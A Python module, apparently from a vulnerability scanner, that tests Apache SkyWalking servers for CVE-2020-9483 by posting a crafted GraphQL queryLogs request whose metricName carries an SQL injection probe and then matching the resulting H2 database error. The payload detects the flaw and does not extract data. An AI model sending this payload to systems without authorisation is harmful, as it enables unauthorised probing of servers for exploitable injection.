#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# import re

cve_2020_9483_payloads = [
    {
        'path': 'graphql',
        'data': '''{"query":"query queryLogs($condition:LogQueryCondition){queryLogs(condition: $condition) {total logs {serviceId serviceName isError content}}}","variables":{"condition":{"metricName":"sqli","state":"ALL","paging":{"pageSize":10}}}}'''
    },
#     {
#         'path': 'graphql',
#         'data': '''{
#     "query":"query queryLogs($condition: LogQueryCondition) {
#   queryLogs(condition: $condition) {
#     total
#     logs {
#       serviceId
#       serviceName
#       isError
#       content
#     }
#   }
# }
# ",
#     "variables":{
#         "condition":{
#             "metricName":"sqli",
#             "state":"ALL",
#             "paging":{
#                 "pageSize":10
#             }
#         }
#     }
# }'''
#     },
]

def cve_2020_9483_scan(clients):
    ''' 在Apache Skywalking 8.3.0版本及以前的GraphQL接口中, 存在一处H2 Database SQL注入漏洞 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ApacheSkyWalking',
        'vul_type': 'SQLinject',
        'vul_id': 'CVE-2020-9483',
    }

    headers = {
        'Content-Type': 'application/json'
    }

    for payload in cve_2020_9483_payloads:
        path = payload['path']
        data = payload['data']

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('Exception while fetching data (/queryLogs) : Table \\"SQLI\\" not found' in res.text)
            and ('select 1 from sqli where  1=1' in res.text)
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
